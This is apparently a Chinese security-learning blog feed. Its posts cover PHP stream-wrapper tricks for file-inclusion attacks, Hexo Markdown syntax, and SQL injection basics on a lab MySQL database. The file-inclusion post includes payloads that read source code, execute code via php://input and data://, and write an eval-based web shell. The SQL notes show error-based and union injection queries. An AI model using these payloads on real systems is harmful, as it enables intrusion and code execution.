class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><blockquote><p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。</p></blockquote><p>简而言之，就是PHP中内置的，类似于URL的协议。</p><h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file:// 协议"></a>file:// 协议</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><p>allow_url_fopen:off/on<br>allow_url_include :off/on</p><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>读取本地文件，且不受allow_url_fopen、allow_url_include的影响。</p><p>参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。</p><h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><p>file:// 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 fopen() 和 file_get_contents()，include_path 会可选地搜索，也作为相对的路径</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//192.168.138.166/fi/06.php?filename=./test.txt  // 相对路径</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.138.166/fi/06.php?filename=/var/www/html/fi/test.txt // 绝对路径</span>http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt    // 这里使用的是参考文章的内容。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="php-协议"><a href="#php-协议" class="headerlink" title="php:// 协议"></a>php:// 协议</h3><h4 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h4><p>allow_url_fopen:off/on<br>allow_url_include :仅php://input php://stdin php://memory php://temp 需要on</p><h4 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h4><p>php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，</p><p>php://filter用于读取源码，php://input用于执行php代码。</p><h4 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h4><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><table><thead><tr><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=”multipart/form-data” 的时候php://input 是无效的。</td></tr><tr><td>php://output</td><td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php://fd    (&gt;=5.3.6)</td><td>允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。</td></tr><tr><td>php://memory php://temp    (&gt;=5.1.0)</td><td>一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。</td></tr><tr><td>php://filter    (&gt;=5.0.0)</td><td>一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器</td></tr></tbody></table><h3 id="php-filter详解"><a href="#php-filter详解" class="headerlink" title="php://filter详解"></a>php://filter详解</h3><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p><table><thead><tr><th>php://filter 参数</th><th>描述</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。</td></tr><tr><td>read=&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（**) 分隔</td></tr><tr><td>write=&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（\    ) 分隔</td></tr><tr><td>&lt;; 两个链的过滤器&gt;</td><td>任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><h4 id="可用的过滤器列表（4类）"><a href="#可用的过滤器列表（4类）" class="headerlink" title="可用的过滤器列表（4类）"></a>可用的过滤器列表（4类）</h4><table><thead><tr><th>字符串过滤器</th><th>作用</th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于str_rot13()，rot13变换(一种简单的替换型加密)</td></tr><tr><td>string.toupper</td><td>等同于strtoupper()，转大写字母</td></tr><tr><td>string.tolower</td><td>等同于strtolower()，转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于strip_tags()，去除html、PHP语言标签</td></tr></tbody></table><table><thead><tr><th>转换过滤器</th><th>作用</th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td>等同于base64_encode()和base64_decode()，base64编码解码</td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td>quoted-printable 字符串与 8-bit 字符串编码码  一般不怎么用</td></tr></tbody></table><table><thead><tr><th>压缩过滤器</th><th>作用</th></tr></thead><tbody><tr><td>zlib.deflate &amp; zlib.inflate</td><td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress</td><td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td></tr></tbody></table><h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><ol><li>php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）</li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//192.168.138.166/fi/06.php?filename=php://filter/read=convert.base64-encode/resource=06.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>php://input + [POST DATA]执行php代码</li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php">http://127.0.0.1/include.php?file=php://input[POST DATA部分]<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果有写入权限</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http://127.0.0.1/include.php?file=php://input[POST DATA部分]<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1juhua.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_GET[cmd]); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="zip-amp-bzip2-amp-zlib-协议"><a href="#zip-amp-bzip2-amp-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib:// 协议"></a>zip:// &amp; bzip2:// &amp; zlib:// 协议</h3><h4 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h4><p>allow_url_fopen:off/on<br>allow_url_include :off/on</p><h4 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h4><p>zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。</p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><ol><li>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）</li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//localhost:7777/file.php?filename=zip://C:\phpstudy_pro\WWW\phpinfo.zip%23phpinfo.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="compress-bzip2-file-bz2"><a href="#compress-bzip2-file-bz2" class="headerlink" title="compress.bzip2://file.bz2"></a>compress.bzip2://file.bz2</h3><p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="compress-zlib-file-gz"><a href="#compress-zlib-file-gz" class="headerlink" title="compress.zlib://file.gz"></a>compress.zlib://file.gz</h3><p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data:// 协议"></a>data:// 协议</h3><h4 id="条件：-1"><a href="#条件：-1" class="headerlink" title="条件："></a>条件：</h4><p>allow_url_fopen:on<br>allow_url_include :on</p><h3 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h3><p>自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p><h4 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h4><pre class="line-numbers language-none"><code class="language-none">data:&#x2F;&#x2F;text&#x2F;plain,data:&#x2F;&#x2F;text&#x2F;plain;base64,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">http://127.0.0.1/include.php?file=data://text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?</span>php<span class="token operator">%</span><span class="token number">20</span>phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="http-amp-https-协议"><a href="#http-amp-https-协议" class="headerlink" title="http:// &amp; https:// 协议"></a>http:// &amp; https:// 协议</h3><h4 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a>条件</h4><p>allow_url_fopen:on<br>allow_url_include :on</p><h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;phpinfo.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar:// 协议"></a>phar:// 协议</h3><p>phar://协议与zip://类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p><p><a href="https://paper.seebug.org/680/">seebug - 利用 phar 拓展 php 反序列化漏洞攻击面</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/articles/web/182280.html">Web安全实战系列：文件包含漏洞</a><br><a href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结 - SegmentFault 思否</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 文件包含漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界，Web_php_include</title>
      <link href="/2021/09/05/gong-fang-shi-jie-web-php-include/"/>
      <url>/2021/09/05/gong-fang-shi-jie-web-php-include/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hexo Markdown 语法</title>
      <link href="/2021/09/03/hexo-markdown-yu-fa/"/>
      <url>/2021/09/03/hexo-markdown-yu-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>本主题加入目录的语法为</p><pre class="line-numbers language-none"><code class="language-none">##, ###, ####<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="代码块高亮"><a href="#代码块高亮" class="headerlink" title="代码块高亮"></a>代码块高亮</h2><p>使用反引号<br>效果为：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">hello</span><span class="token punctuation">:</span> hexo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="斜体与粗体"><a href="#斜体与粗体" class="headerlink" title="斜体与粗体"></a>斜体与粗体</h2><pre class="line-numbers language-none"><code class="language-none">*斜体*  **粗体**<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>效果为：<br><em>斜体</em> <strong>粗体</strong></p><h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h2><p>语法</p><pre class="line-numbers language-none"><code class="language-none">***<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>效果为：</p><p>你好</p><hr><p>Hello</p><h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><p>插入文字超链接的格式如下 ：</p><pre class="line-numbers language-none"><code class="language-none">[链接文字](链接地址 &quot;链接标题&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>插入图片超链接的格式如下：</p><pre class="line-numbers language-none"><code class="language-none">![图片说明](图片链接 &quot;图片标题&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h2><p>使用 *，+，- 表示无序列表。</p><pre class="line-numbers language-none"><code class="language-none">+ 无序列表项 一- 子无序列表 一- 子无序列表 二* 子无序列表 三+ 无序列表项 二+ 无序列表项 三<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>无序列表项 一<ul><li>子无序列表 一</li><li>子无序列表 二<ul><li>子无序列表 三</li></ul></li></ul></li><li>无序列表项 二</li><li>无序列表项 三</li></ul><h2 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h2><p>使用数字和点表示有序列表。</p><pre class="line-numbers language-none"><code class="language-none">1. 有序列表项 一1. 子有序列表项 一2. 子有序列表项 二2. 有序列表项 二3. 有序列表项 三<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>有序列表项 一<ol><li>子有序列表项 一</li><li>子有序列表项 二</li></ol></li><li>有序列表项 二</li><li>有序列表项 三</li></ol>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL Injection</title>
      <link href="/2021/09/03/sql-injection/"/>
      <url>/2021/09/03/sql-injection/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入点"><a href="#SQL注入点" class="headerlink" title="SQL注入点"></a>SQL注入点</h2><p>  1.与<strong>后端</strong>有交互的点(数据库)</p><p>  2.报文头部,可能有注入点</p><p>  3.语句对数据库有什么影响,怎么知道是否产生影响(报错注入,数据库返回错误)</p><p>  4.数据库可以存放图片路径，那么这一点也可以作为注入点</p><h2 id="如何判断SQL存在注入点"><a href="#如何判断SQL存在注入点" class="headerlink" title="如何判断SQL存在注入点"></a>如何判断SQL存在注入点</h2><p>  1.error-based</p><p>  譬如单引号,双引号等</p><p>  <a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</a><br>  但是如果怎么样都不显示错误时,我们很显然要选择其他方式进行注入。</p><p>  2.Union-based </p><p>  如果联合查询出结果，那么必然有注入点。</p><p>  3.Time-based Blind<br>  核心函数为sleep();<br>  <a href="https://www.cnblogs.com/backlion/p/9721693.html">https://www.cnblogs.com/backlion/p/9721693.html</a></p><p>  4.Boolen-based Blind<br>  <a href="https://blog.csdn.net/weixin_40709439/article/details/81355856">https://blog.csdn.net/weixin_40709439/article/details/81355856</a></p><p>  5.Stacked<br>  <a href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a></p><h2 id="MySQL的搭建"><a href="#MySQL的搭建" class="headerlink" title="MySQL的搭建"></a>MySQL的搭建</h2><p>  使用PHPStudy即可，</p><h2 id="MySQL语法"><a href="#MySQL语法" class="headerlink" title="MySQL语法"></a>MySQL语法</h2><p>  所用语句都是根据root数据库、user表进行查询的</p><ol><li>查看数据库</li></ol>  <pre class="line-numbers language-none"><code class="language-none">show databases; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  注意:databases的s, 以及分号;</p><ol start="2"><li>查看表</li></ol>  <pre class="line-numbers language-none"><code class="language-none">show tables;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>从中查看user表中内容</li></ol>  <pre class="line-numbers language-none"><code class="language-none">select * from users; select user_id, first_name, last_name; # 查询三列<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>  <pre class="line-numbers language-none"><code class="language-none">  mysql&gt; select * from users;+---------+------------+-----------+---------+----------------------------------+-----------------------------+---------------------+--------------+| user_id | first_name | last_name | user    | password                         | avatar                      | last_login          | failed_login |+---------+------------+-----------+---------+----------------------------------+-----------------------------+---------------------+--------------+|       1 | admin      | admin     | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | &#x2F;hackable&#x2F;users&#x2F;admin.jpg   | 2021-08-11 16:33:22 |            0 ||       2 | Gordon     | Brown     | gordonb | e99a18c428cb38d5f260853678922e03 | &#x2F;hackable&#x2F;users&#x2F;gordonb.jpg | 2021-08-11 16:33:22 |            0 ||       3 | Hack       | Me        | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | &#x2F;hackable&#x2F;users&#x2F;1337.jpg    | 2021-08-11 16:33:22 |            0 ||       4 | Pablo      | Picasso   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | &#x2F;hackable&#x2F;users&#x2F;pablo.jpg   | 2021-08-11 16:33:22 |            0 ||       5 | Bob        | Smith     | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | &#x2F;hackable&#x2F;users&#x2F;smithy.jpg  | 2021-08-11 16:33:22 |            0 |+---------+------------+-----------+---------+----------------------------------+-----------------------------+---------------------+--------------+5 rows in set (0.01 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>注释的三种方式</li></ol><p>  注意, “– “后面有空格</p>  <pre class="line-numbers language-注释的三种方式" data-language="注释的三种方式"><code class="language-注释的三种方式">#DELETE FROM SeatInformation&#x2F;*DELETE FROM SeatInformation *&#x2F;-- DELETE FROM SeatInformation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  /**/如果以下面方式进行使用是不会影响语句的执行的</p>  <pre class="line-numbers language-none"><code class="language-none">SELECT COUNT(first_name)&#x2F;**&#x2F;count, last_name &#x2F;**&#x2F;FROM users GROUP&#x2F;**&#x2F; BY user_id HAVING count &#x3D; 3;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  所以我们可以想一下如果以下面的方式呢？如果可以的话完全可以绕过一些过滤，但是很可惜并不可以。尽管不可以，但是这种思考的过程却非常的重要。<br>  <pre class="line-numbers language-none"><code class="language-none">SELECT COUNT(first_name)c&#x2F;**&#x2F;ount, last_name FROM users GR&#x2F;**&#x2F;OUP BY user_id HAVING count &#x3D; 3;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><ol start="5"><li>Where 条件语句</li></ol>  <pre class="line-numbers language-none"><code class="language-none">运算符描述&#x3D;    等于&lt;&gt;    不等于。注释：在 SQL 的一些版本中，该操作符可被写成 !&#x3D;&gt;    大于&lt;    小于&gt;&#x3D;    大于等于&lt;&#x3D;    小于等于BETWEEN在某个范围内LIKE搜索某种模式IN    指定针对某个列的多个可能值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  熟练运用运算符，我们便可以进行一些绕过，譬如过滤了=，我们便可以使用以下方式来代替</p>  <pre class="line-numbers language-none"><code class="language-none">where id &#x3D; 2where id like 2where id &lt;3 and id &gt;1where id between 2 and 2where id like 2where id in (2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  此外MySQL是可以进行字符串的比较的譬如:</p>  <pre class="line-numbers language-none"><code class="language-none">SELECT * FROM users WHERE last_name &gt; &#39;admin&#39;;2GordonBrowngordonbe99a18c428cb38d5f260853678922e03&#x2F;hackable&#x2F;users&#x2F;gordonb.jpg2021-08-11 16:33:220 3HackMe13378d3533d75ae2c3966d7e0d4fcc69216b&#x2F;hackable&#x2F;users&#x2F;1337.jpg2021-08-11 16:33:2204PabloPicassopablo0d107d09f5bbe40cade3de5c71e9e9b7&#x2F;hackable&#x2F;users&#x2F;pablo.jpg2021-08-11 16:33:2205BobSmithsmithy5f4dcc3b5aa765d61d8327deb882cf99&#x2F;hackable&#x2F;users&#x2F;smithy.jpg2021-08-11 16:33:220<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="6"><li>And，Or</li></ol><p>  MySQL语句中And，Or与其他编程语言用法相同。</p><p>  同时AND 与 &amp;&amp;相同，Or与 ||相同，<strong>而&amp;为位AND（Bitwise AND）</strong>。</p><p>  骚操作:</p>  <pre class="line-numbers language-none"><code class="language-none">SELECT * FROM users WHERE user_id &#x3D; 1 and (1&#x3D;1) &#x3D; 1;SELECT * FROM users WHERE user_id &#x3D; 3&#x2F;3 and (1&#x3D;1) &#x3D; 1;SELECT * FROM users WHERE 2&#x2F;2 &#x3D; (3&#x3D;3);SELECT * FROM users WHERE user_id &#x3D;  4&#x2F;2 &#x3D; (2&#x3D;1);(这条语句似乎等于user_id !&#x3D; 2，原理我也没有查到，尝试了一下这里！&#x3D;中的&#x3D;无法通过上述&#x3D;的替代方法来进行替代)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="7"><li>Like模糊查询</li></ol>  <pre class="line-numbers language-none"><code class="language-none">SELECT * FROM users WHERE user_id  &gt;  1  and first_name like &quot;%ck&quot;;SELECT * FROM users WHERE user_id  &gt;  1  and first_name like &quot;%%&quot;; -- 相当于 1 &#x3D; 1SELECT * FROM users WHERE user_id  &gt;  1  and first_name like &quot;_a%&quot;; -- &#39;_&#39;占位符,表示第二个字母为a,第一个字母无所谓<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="8"><li>Order by</li></ol><p>  目的为排序<br>  <pre class="line-numbers language-none"><code class="language-none">SELECT * FROM users WHERE user_id  &gt;  1  ORDER BY first_name; -- 表明以first_name 为标准进行排序SELECT * FROM users WHERE user_id  &gt;  1  ORDER BY 1;          -- 表明以第1列为标准进行排序(列号从1开始)SELECT * FROM users WHERE user_id  &gt;  1  ORDER BY 1 LIMIT a,b;-- LIMIT的使用方法为: 从第a(从0开始)行开始展示b行SELECT * FROM users WHERE user_id  &gt;  1  ORDER BY 1 LIMIT b;  -- 从0开始展示b行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p><p>  <img src="LIMIT.png"></p><ol start="9"><li>Aliases(重命名)</li></ol>  <pre class="line-numbers language-语句" data-language="语句"><code class="language-语句">SELECT user_id as &#39;id&#39; FROM users;SELECT user_id &#39;id&#39; FROM users;     -- as可以省略<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>  <pre class="line-numbers language-结果" data-language="结果"><code class="language-结果">id12345<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>  <pre class="line-numbers language-进一步" data-language="进一步"><code class="language-进一步">SELECT(SELECT first_name  FROM users WHERE user_id &#x3D; 1)s;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>  <pre class="line-numbers language-结果为" data-language="结果为"><code class="language-结果为">sadmin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>  对于上面的符合语句我的理解为，里面的一层SQL语句获得了字段名为first_name,值为admin的查询结果（已经相当于常量与1类似），而外面的一层实际上是为了将字段名进行重命名，与select 1 as a类似, 除此以外没有其他作用。</p><p>  <img src="Aliases.png"></p><ol start="10"><li>函数</li></ol><p>(1) min()，max()</p><pre class="line-numbers language-none"><code class="language-none">SELECT MIN(user_id) FROM users;     -- 查询user_id最小的值SELECT MAX(user_id) FROM users;     -- 查询user_id最大的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>(2) count(),avg(),sum()</p><p>(3) concat()</p><pre class="line-numbers language-语句" data-language="语句"><code class="language-语句">SELECT CONCAT(&quot;SQL &quot;, &quot;Runoob &quot;, &quot;Gooogle &quot;, &quot;Facebook&quot;) AS ConcatenatedString;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-结果" data-language="结果"><code class="language-结果">ConcatenatedStringSQL Runoob Gooogle Facebook<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>(4) 报错注入语句分析</p><pre class="line-numbers language-语句" data-language="语句"><code class="language-语句">SELECT * FROM users WHERE user_id &#x3D; 1 and updatexml(1,CONCAT(0x7e,DATABASE(),0x7e,user(),0x7e,@@datadir),1);SELECT CONCAT(0x7e,DATABASE(),0x7e,user(),0x7e,@@datadir)s;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-结果" data-language="结果"><code class="language-结果">s~root~root@localhost~C:\phpstudy_pro\Extensions\MySQL5.7.26\data\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>0x7e即~，DataBase（）即当前使用数据库名，user（）返回当前用户，@@datadir即存放数据的地址</p><p>UpdateXML(xml_target, xpath_expr, new_xml)函数的含义</p><p>此函数用新的 XML 片段 new_xml 替换给定 XML 标记 xml_target 片段的单个部分，然后返回更改后的 XML。被替换的 xml_target 部分与用户提供的 XPath 表达式 xpath_expr 匹配。</p><ol start="11"><li>Union</li></ol><p>注意: Union两边查询语句所得结果的column必须相同</p><pre class="line-numbers language-none"><code class="language-none">SELECT * FROM users  union SELECT 1,2,3,4,5,6,7,8 FROM users;SELECT * FROM users  union SELECT 1,2,3,4,5,DATABASE(),USER(),VERSION() FROM users; -- 后面的语句中数字完全可以用函数替代。user_idfirst_namelast_nameuserpasswordavatarlast_loginfailed_login1adminadminadmin5f4dcc3b5aa765d61d8327deb882cf99&#x2F;hackable&#x2F;users&#x2F;admin.jpg2021-08-11 16:33:2202GordonBrowngordonbe99a18c428cb38d5f260853678922e03&#x2F;hackable&#x2F;users&#x2F;gordonb.jpg2021-08-11 16:33:2203HackMe13378d3533d75ae2c3966d7e0d4fcc69216b&#x2F;hackable&#x2F;users&#x2F;1337.jpg2021-08-11 16:33:2204PabloPicassopablo0d107d09f5bbe40cade3de5c71e9e9b7&#x2F;hackable&#x2F;users&#x2F;pablo.jpg2021-08-11 16:33:2205BobSmithsmithy5f4dcc3b5aa765d61d8327deb882cf99&#x2F;hackable&#x2F;users&#x2F;smithy.jpg2021-08-11 16:33:22012345678<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以从上面的结果中发现union后面语句查询结果只有一行，但是下面语句却有5行，即原本表中的行数。</p><p><img src="union1.png"></p><p>这是因为union是有distinct的，即去重。如果想要全部展示可以再union后面加all</p><ol start="12"><li>Group by</li></ol><p>下面第一条语句的意思为，按照user_id进行分组。</p><p>第二条语句的意思为，按照id分组，每一组中的firstname值各有几个</p><pre class="line-numbers language-none"><code class="language-none">SELECT * FROM users GROUP BY user_id;SELECT COUNT(first_name)count, last_name FROM users GROUP BY user_id;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果只想要看count值为3的结果怎么办呢？之前我们一般使用where但是在这里我们需要使用having即，</p><pre class="line-numbers language-none"><code class="language-none">SELECT COUNT(first_name)count, last_name FROM users GROUP BY user_id HAVING count &#x3D; 3;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="13"><li>Joins</li></ol><p>(1) INNER JOIN即取交集</p><pre class="line-numbers language-none"><code class="language-none">SELECT * FROM users INNER JOIN guestbook ON users.user_id &#x3D; guestbook.comment_id; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>取user_id与comment_id相同的数据</p><p>(2) Left JOIN</p><p>LEFT JOIN 